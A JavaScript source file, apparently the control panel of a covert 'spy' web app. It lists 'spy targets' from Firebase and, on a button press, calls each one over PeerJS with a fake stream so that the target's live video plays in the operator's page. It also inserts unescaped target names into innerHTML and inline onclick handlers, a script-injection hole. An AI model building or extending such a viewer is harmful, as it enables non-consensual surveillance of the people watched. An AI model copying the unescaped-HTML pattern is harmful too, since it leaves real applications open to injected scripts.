import { onValue, spyTargetsRef } from "../firebase.js";
import { createMediaStreamFake } from "../utils.js";

window.onload = () => {
  var videoEle = document.querySelector("#video");
  var btnEndCall = document.querySelector("#btn-endcall");

  var peer = new Peer();
  var currentPeer, currentCall;

  function call(peerid, name = "?") {
    endCall();

    Swal.fire({
      icon: "info",
      title: `Đang gọi ${name}...`,
      showCancelButton: true,
      cancelButtonText: "Hủy",
      allowOutsideClick: false,
      allowEscapeKey: false,
    }).then((result) => {
      if (result.dismiss === Swal.DismissReason.cancel) endCall();
    });
    Swal.showLoading();

    currentPeer = peer.connect(peerid);

    currentPeer.on("open", function () {
      currentCall = peer.call(peerid, createMediaStreamFake());
      currentCall.on("stream", function (remoteStream) {
        Swal.close();
        videoEle.srcObject = remoteStream;
      });
    });
  }

  function endCall() {
    if (currentPeer) {
      currentPeer.close();
    }
    if (currentCall) {
      currentCall.close();
    }

    currentCall = null;
    currentPeer = null;
    videoEle.srcObject = null;
  }

  onValue(spyTargetsRef, (snapshot) => {
    const data = snapshot.val();

    console.log(data);

    const ul = document.querySelector("#list-spy-targets");
    ul.innerHTML = data
      ? Object.keys(data)
          .map(
            (peerid) => `<li>
                    ${data[peerid].name} (${data[peerid].joinedAt})
                    <button onclick="call('${peerid}', '${data[peerid].name}')">Call</button>
                </li>`
          )
          .join("")
      : "";
  });

  window.call = call;
  btnEndCall.addEventListener("click", endCall);
};
